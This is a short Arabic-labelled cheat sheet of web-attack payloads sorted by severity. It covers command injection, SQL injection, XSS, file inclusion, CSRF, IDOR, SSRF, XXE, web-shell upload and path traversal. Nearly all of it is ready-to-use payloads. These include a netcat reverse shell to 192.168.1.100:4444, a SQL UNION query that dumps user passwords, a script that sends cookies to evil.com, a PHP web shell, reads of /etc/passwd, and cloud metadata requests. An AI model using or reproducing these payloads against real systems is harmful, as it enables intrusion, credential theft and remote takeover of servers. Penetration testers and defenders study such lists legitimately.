حرج

RCE — Remote Code Execution

تنفيذ أوامر عن بعد على الخادم

# اختبار الثغرة
?cmd=;ls
?exec=|whoami
# استغلال متقدم
?cmd=nc -e /bin/sh 192.168.1.100 4444
عالي

SQLi — SQL Injection

حقن SQL في قواعد البيانات

# اختبار
?id=1' OR '1'='1' --
# استغلال
?id=1' UNION SELECT username,password FROM users --
# SQLmap
sqlmap -u "http://target.com?id=1" --dbs
متوسط

XSS — Cross-Site Scripting

حقن سكربتات خبيثة في صفحات الويب

# اختبار
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
# سرقة الكوكيز
<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
حرج

LFI — Local File Inclusion

استغلال الملفات المحلية

# اختبار
?page=../../../../etc/passwd
# LFI to RCE
?page=php://filter/convert.base64-encode/resource=index.php
متوسط

CSRF — Cross-Site Request Forgery

تزوير الطلبات عبر المواقع

<img src="http://target.com/change_email?email=evil@evil.com">
<form action="http://target.com/change_password" method="POST">
<input type="hidden" name="password" value="hacked">
</form>
<script>document.forms[0].submit();</script>
متوسط

IDOR — Insecure Direct Object Reference

استغلال المعرفات غير الآمنة

# اختبار
/profile?user_id=1
/profile?user_id=2
# استغلال متقدم
/download?file=private_key.txt
عالي

SSRF — Server-Side Request Forgery

استغلال الخادم لإرسال طلبات داخلية

?url=http://169.254.169.254/latest/meta-data/
?proxy=http://internal-server:8080
?fetch=http://localhost:3306
عالي

XXE — XML External Entity Injection

حقن كيانات XML خارجية

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
عالي

File Upload — رفع الملفات الخبيثة

رفع Web Shell إلى الخادم

<?php system($_GET['cmd']); ?>
# الوصول إلى Web Shell
/uploads/shell.php?cmd=ls
عالي

Path Traversal — اجتياز المسار

الوصول إلى ملفات خارج المجلد المصرح به

?file=../../../../etc/passwd
?path=../../../../windows/win.ini
